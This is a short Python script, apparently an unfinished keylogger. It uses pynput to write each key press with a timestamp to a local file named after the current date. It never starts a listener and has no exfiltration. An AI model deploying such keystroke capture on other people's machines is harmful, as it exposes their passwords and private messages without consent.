from pynput import keyboard
from datetime import datetime, date, time

#get the current time and date
now = datetime.now()
#print(now)
#print(type(now))

#format it for our file name
now_str = now.strftime("%Y-%m-%d-%H-%M-%S")
#print(now_str)

#create a new file with write perms
f = open(now_str, "w")

def on_press(key):
    try:
        time = str(datetime.now())
        with open(now_str+".txt", 'a') as f:
            f.write(f"[{time}]: {key}\n")

    except Exception as e:
        print(f"Error: {e}")
